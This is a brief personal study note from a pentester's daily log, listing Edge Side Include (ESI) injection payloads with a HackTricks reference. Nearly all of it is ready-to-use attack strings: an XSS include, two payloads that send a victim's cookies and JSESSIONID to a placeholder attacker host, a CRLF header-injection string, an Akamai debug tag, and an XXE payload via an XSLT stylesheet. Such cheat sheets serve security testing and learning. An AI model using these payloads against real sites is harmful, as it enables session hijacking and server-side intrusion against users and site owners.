Daily Notes : Day 83 
ESI Injcetion - Exploitation 

XSS - 
<esi:include src=http://<domain>.com/xss.html>

COOKIE STEALING - 
<esi:include src=http://<attacker>.com/$(HTTP_COOKIE)>
<esi:include src="http://<attacker>.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />

AKAMAI DEBUG -<esi:debug/>

CRLF - 
<esi:include src="http://<domain>.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>

XXE (ESI + XSLT) - 
<esi:include src="http://<host>/poc.xml" dca="xslt" stylesheet="http://<host>/poc.xsl" />

Refernces: https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection